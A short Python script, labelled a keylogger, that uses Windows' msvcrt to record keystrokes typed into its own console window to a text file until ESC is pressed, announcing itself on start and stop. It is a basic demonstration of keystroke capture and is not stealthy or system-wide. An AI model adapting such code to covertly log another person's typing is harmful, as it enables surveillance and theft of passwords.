import msvcrt

PATH = "Keylogger.txt"

def main():
    print("KEYLOGGER IS RUNNING. PRESS [ESC] TO STOP.")
    with open(PATH, "w") as file:
        while True:
            if msvcrt.kbhit():
                capture = msvcrt.getch().decode('utf-8')
                if capture == ' ':
                    file.write(" ")
                elif capture == '\t':
                    file.write("[TAB]")
                elif capture == '\r':
                    file.write("[ENTER]")
                elif capture == '\x1b':
                    file.write("[ESC]")
                elif capture == '\b':
                    file.write("[BACKSPACE]")
                else:
                    file.write(capture)
                if capture == chr(27): 
                    print("KEYLOGGER STOPPED.")
                    break

if __name__ == "__main__":
    main()
